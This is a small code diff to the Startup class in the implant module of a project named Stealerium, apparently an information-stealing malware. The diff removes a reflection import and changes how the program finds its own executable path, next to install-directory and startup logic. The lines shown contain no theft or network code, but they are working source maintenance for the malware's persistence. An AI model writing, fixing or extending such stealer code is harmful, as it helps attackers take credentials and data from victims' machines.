@@ -1,6 +1,5 @@
 ﻿using System;
 using System.IO;
-using System.Reflection;
 using Microsoft.Win32;
 using Stealerium.Helpers;
 
@@ -9,7 +8,7 @@ namespace Stealerium.Modules.Implant
     internal sealed class Startup
     {
         // Install
-        public static readonly string ExecutablePath = Assembly.GetEntryAssembly().Location;
+        public static readonly string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory;
         private static readonly string InstallDirectory = Paths.InitWorkDir();
 
         private static readonly string InstallFile = Path.Combine(
